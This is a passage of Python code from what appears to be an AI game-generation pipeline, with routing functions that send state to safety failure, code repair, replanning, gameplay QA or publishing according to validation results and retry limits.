        "_agent": "DoneHandler",
        "_logs": [f"generation succeeded for game_id={state.get('game_id', 'unknown')}", f"preview url: {state.get('preview_url', 'pending')}"],
    }


def should_continue_after_safety(state: dict) -> str:
    return "failed" if state.get("status") == "failed" else "intent_spec"


def should_continue_after_validation(state: dict) -> str:
    if (state.get("validation_result") or {}).get("valid"):
        return "gameplay_qa"
    if state.get("repair_attempts", 0) < MAX_REPAIR:
        return "repair_code"
    if state.get("replan_attempts", 0) < MAX_REPLAN:
        return "replan_game_design"
    return "failed"


def should_continue_after_gameplay_qa(state: dict) -> str:
    if (state.get("gameplay_qa_result") or {}).get("passed"):
        return "publish_artifact"
    if state.get("gameplay_repair_attempts", 0) < MAX_GAMEPLAY_REPAIR:
        return "gameplay_repair"
    if state.get("replan_attempts", 0) < MAX_REPLAN:
        return "replan_game_design"
    return "failed"
